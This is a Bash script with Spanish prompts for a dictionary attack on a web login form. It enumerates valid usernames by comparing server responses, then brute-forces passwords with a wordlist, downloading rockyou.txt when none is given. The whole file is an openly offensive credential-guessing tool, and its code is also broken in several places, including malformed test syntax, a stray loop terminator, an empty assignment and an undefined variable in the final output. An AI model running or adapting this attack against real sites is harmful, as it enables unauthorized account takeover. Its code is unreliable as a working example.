#!/bin/bash
function ataque_diccionario() {
start=1
URL=$(echo -e "$url")
echo "Dime un usuario o un fichero txt con un listado de usuarios"
read document
#añadir a.txt

if [ -f  $document ]
then
    echo "Recuerda que este proceso puede tardar minutos."
    total=$(wc -l < $document)
    while [ $start -le $total ]
        do
        test=$(awk "NR==$start{print $1}" $document)
        if [[ $(curl -s -d "username=$test&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
        then
            echo -e "El usuario és $test"
            username=$test
            break 1
        fi
        ((start = start + 1))
    #    echo $start
    done
else
    if [[! $(curl -s -d "username=$document&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
        then
            echo -e "El usuario és $document"
            username=$document
            break 1
        else
            echo "Usuario inexistente."
        fi
        ((start = start + 1))
    #    echo $start
    done
fi

echo "Quieres utilizar un diccionario de contraseñas en especifico? Indica la ruta del fichero de ser así, si no omite la respuesta."
read document
if [ -f  $document ] 
then
    echo "Fichero valido"
else
    echo "El Fichero no es valido, usaremos un diccionario propio"
    
    wget "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwii7MnruK_3AhW67rsIHY4MDP0QFnoECAcQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd"
    document= rockyou.txt
start=1
total=$(wc -l < $document)
while [ $start -le $total ]
    do
    test=$(awk "NR==$start{print $1}" $document)
    if ! [[ $(curl -i -s -d "username=$username&password=$test" $URL | grep -e "302 Found") ]]
    then
        password=$test
        break 1
    fi
    ((start = start + 1))
done
echo -e "El usuario es $usuari y su contraseña és $password"
}
